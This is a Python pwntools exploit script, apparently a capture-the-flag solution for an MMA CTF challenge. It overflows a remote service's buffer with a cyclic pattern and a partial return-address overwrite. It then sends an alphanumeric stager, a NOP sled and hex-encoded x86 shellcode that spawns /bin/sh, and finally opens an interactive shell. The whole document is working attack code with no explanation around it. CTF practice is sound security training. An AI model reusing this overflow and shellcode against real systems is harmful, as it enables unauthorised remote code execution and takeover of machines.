from pwn import *
import time

stager = 'P4040P40Q40Q40Q4A40Q4q40Q40Q40a40X4040H0D9N0D9O40j1X0D9O40X40X50000P53000Z40402N'
binsh = '31c931d252682f2f7368682f62696e89e331c0b00bcd80'.decode('hex')

#s = remote('192.168.6.129', 4000)
s = remote('pwn1.chal.mmactf.link', 38264)

print s.recvuntil('paragraph:')
time.sleep(3)

#0x080a4666: ret  ;  (1 found)
payload = util.cyclic.cyclic(length=4079) + p16(0x4666) + '\n'
s.send(payload)

time.sleep(10)
print s.recv(8192)

payload = stager
s.send(payload + '\n')

time.sleep(0.1)

s.send('\x90' * 0x100 + binsh)

s.interactive()
